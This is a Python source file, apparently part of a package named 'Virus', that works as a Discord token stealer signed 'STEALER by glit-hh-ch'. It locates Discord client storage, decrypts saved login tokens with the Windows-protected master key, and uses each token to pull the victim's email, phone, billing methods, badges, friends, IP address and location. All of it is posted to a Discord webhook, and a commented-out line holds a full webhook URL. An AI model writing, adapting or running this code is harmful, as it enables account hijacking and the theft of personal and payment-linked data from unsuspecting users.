from Virus.Helpers.Support import BrowsersSupport, BrowsersData
from Virus.Helpers.Counter import Count
from Virus.Helpers.TG_bot_sender import Sender

import os
from base64 import b64decode
import base64, win32crypt
from json import dumps, loads
import re
import requests


DISCORD_WEBHOOK = "DISCORD_WEBHOOK"
# DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1095425120815808562/E-yGgPKdhnw4d57V-rcoBg0cimBknSz3fm2zNorjyO2WVSusrrJpP_onExmyNEz14Ckt"
roaming = os.getenv('APPDATA')

Tokens = ''
ip = ''

discordPaths = [
    [f"{roaming}/Discord",       "/Local Storage/leveldb"],
    [f"{roaming}/Lightcord",     "/Local Storage/leveldb"],
    [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
    [f"{roaming}/discordptb",    "/Local Storage/leveldb"],
]

badgeList = [
    {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
    {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
    {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
    {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
    {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
    {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
    {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
    {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
    {"Name": 'Partnered_Server_Owner', 'Value': 2, 'Emoji': "<:partner:874750808678354964> "},
    {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
]


def header(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    return headers


def checkToken(token):
    try:
        requests.get("https://discordapp.com/api/v6/users/@me", headers=header(token))
        return True
    except:
        return False



def GetTokenInfo(token):
    userjson = requests.get("https://discordapp.com/api/v6/users/@me", headers=header(token)).json()
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = "-"

    if "premium_type" in userjson:
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<:classic:896119171019067423> "
        elif nitrot == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    if "phone" in userjson: phone = f'`{userjson["phone"]}`'

    return username, hashtag, email, idd, pfp, flags, nitro, phone


def GetBilling(token):
    try:
        billingjson = requests.get("https://discord.com/api/users/@me/billing/payment-sources", headers=header(token)).json()
    except:
        return False

    if billingjson == []: return " -"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "

    return billing


def GetBadge(flags):
    if flags == 0: return ''

    OwnedBadges = ''
    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges


def GetUHQFriends(token):
    try:
        friendlist = requests.get("https://discord.com/api/v6/users/@me/relationships", headers=header(token)).json()
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"]:
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist


def getip():
    global ip
    ip = "None"
    try:
        ip = requests.get("https://api.ipify.org").text
    except:
        pass
    return ip


def globalInfo():
    ip = getip()
    username = os.getlogin()
    ipdata = requests.get(f'https://ipinfo.io/{ip}').json()
    contry = ipdata["country"]
    city = ipdata["city"]
    region = ipdata["region"]
    globalinfo = f":{city}({region}):  - `{username} | {ip} ({contry})`"
    return globalinfo


def send_data(data, files=''):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    # Sender.send_data(data, 'Discord')
    for i in range(2):
        try:
            if headers != '':
                requests.post(DISCORD_WEBHOOK, data=data, headers=headers)
                break
            else:
                requests.post(DISCORD_WEBHOOK, data=data)
                break
        except:
            pass
    Count.discord = True


def uploadToken(token, path):
    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)

    if pfp == None:
        pfp = "https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    billing = GetBilling(token)
    badge = GetBadge(flags)
    friends = GetUHQFriends(token)
    if friends == '':
        friends = "No Rare Friends"
    if not billing:
        badge, phone, billing = "🔒", "🔒", "🔒"
    if nitro == '' and badge == '':
        nitro = " -"

    data = {
        "content": f'{globalInfo()} | Found in `{path}`',
        "embeds": [
            {
                "color": 14406413,
                "fields": [
                    {
                        "name": ":rocket: Token:",
                        "value": f"{token}"
                    },
                    {
                        "name": ":envelope: Email:",
                        "value": f"`{email}`",
                        "inline": True
                    },
                    {
                        "name": ":mobile_phone: Phone:",
                        "value": f"{phone}",
                        "inline": True
                    },
                    {
                        "name": ":globe_with_meridians: IP:",
                        "value": f"`{ip}`",
                        "inline": True
                    },
                    {
                        "name": ":beginner: Badges:",
                        "value": f"{nitro}{badge}",
                        "inline": True
                    },
                    {
                        "name": ":credit_card: Billing:",
                        "value": f"{billing}",
                        "inline": True
                    },
                    {
                        "name": ":clown: HQ Friends:",
                        "value": f"{friends}",
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username}#{hashtag} ({idd})",
                    "icon_url": f"{pfp}"
                },
                "footer": {
                    "text": ":space_invader: STEALER by glit-hh-ch",
                    "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
                },
                "thumbnail": {
                    "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
        "username": "Stealer",
        "attachments": []
    }
    send_data(dumps(data).encode())


def GetDiscord(path, arg):
    global Tokens
    if not os.path.exists(f"{path}\\Local State"):
        return

    pathC = path + arg

    pathKey = path + "\\Local State"
    with open(pathKey, 'r', encoding='utf-8') as f:
        local_state = loads(f.read())
    master_key = BrowsersSupport.get_master_key(local_state)

    for file in os.listdir(pathC):
        if file.endswith(".log") or file.endswith(".ldb"):
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    tokenDecoded = BrowsersSupport.DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                    if checkToken(tokenDecoded):
                        if not tokenDecoded in Tokens:
                            Tokens += tokenDecoded
                            uploadToken(tokenDecoded, path)


if __name__ == '__main__':
    for patt in discordPaths:
        GetDiscord(patt[0], patt[1])
